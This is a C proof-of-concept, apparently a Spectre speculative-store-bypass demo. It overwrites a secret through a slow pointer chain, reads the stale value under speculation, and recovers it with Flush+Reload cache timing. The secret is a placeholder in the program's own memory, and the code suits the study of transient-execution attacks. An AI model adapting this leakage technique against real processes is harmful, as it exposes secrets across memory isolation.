#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <x86intrin.h>


// inaccessible (overwritten) secret
#define SECRET      "SEC"
#define OVERWRITE   '#'
#define CACHE_MISS 120

char* data;
char* mem;
int junk = 0;

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);

  end = __rdtscp(&junk);
  _mm_mfence();
  _mm_clflush(ptr);

  return (int)(end - start);
}

char access_array(int x) {
  int tmp;
  // store secret in data
  strcpy(data, SECRET);

  // flushing the data which is used in the condition increases
  // probability of speculation
  _mm_mfence();
  char** data_slowptr = &data;
  char*** data_slowslowptr = &data_slowptr;
  char**** data_ultraslowptr = &data_slowslowptr;
  _mm_mfence();
  _mm_clflush(&x);
  _mm_clflush(data_slowptr);
  _mm_clflush(&data_slowptr);
  _mm_clflush(data_slowslowptr);
  _mm_clflush(&data_slowslowptr);
  _mm_clflush(data_ultraslowptr);
  _mm_clflush(&data_ultraslowptr);
  // ensure data is flushed at this point
  _mm_mfence();

  // overwrite data via different pointer
  // pointer chasing makes this extremely slow
  (*(*(*data_ultraslowptr)))[x] = OVERWRITE;

  // data[x] should now be "#"
  // uncomment next line to break attack
  //_mm_mfence();
  // Encode stale value in the cache
  tmp = data[x];
  maccess(mem + tmp*4096);
}

void cache_decode_pretty(char *leaked, int index) {
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload_t(mem + mix_i * 4096) < CACHE_MISS) {
      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
        leaked[index] = mix_i;
      }
      //sched_yield();
    }
  }
}

int main(int argc, const char **argv) {
  data = malloc(128);
  // Detect cache threshold
  //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  
  int pagesize = 4096;

  mem = malloc(pagesize * 256);
  // page aligned
  // initialize memory
  memset(mem, 0, pagesize * 256);

  // store secret
  strcpy(data, SECRET);

  // Flush our shared memory
  for(int j = 0; j < 256; j++) {
    _mm_clflush(mem + j * pagesize);
  }

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;

  int j = 0;
  for (int i =0; i < 10; i++) {
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);

    // overwrite value with X, then access
    access_array(j);

    _mm_mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    //sched_yield();
  }

  printf("%s", leaked);
  //printf("\n[\x1b[32m>\x1b[0m] Done\n");

  return 0;
}
